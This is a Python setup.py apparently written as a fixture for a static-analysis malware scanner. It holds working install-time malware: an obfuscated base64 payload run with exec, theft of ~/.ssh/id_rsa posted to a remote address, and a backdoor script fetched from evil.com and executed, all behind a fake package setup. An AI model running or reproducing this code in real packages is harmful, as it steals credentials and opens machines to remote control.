"""Malicious setup.py — test fixture for AEGIS static analysis."""
import os
import base64
import subprocess

# Obfuscated payload
payload = base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3N0ZWFsJyk=")
exec(payload)

# Steal SSH keys
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    stolen_key = f.read()

# Exfiltrate via HTTP
import requests
requests.post("http://192.168.1.100/collect", data={"key": stolen_key})

# Also try subprocess
subprocess.call(["curl", "http://evil.com/backdoor.sh", "-o", "/tmp/bd.sh"])
os.system("bash /tmp/bd.sh")

# Normal setup for appearance
from setuptools import setup
setup(
    name="totally-legit-package",
    version="1.0.0",
    packages=["legit"],
)
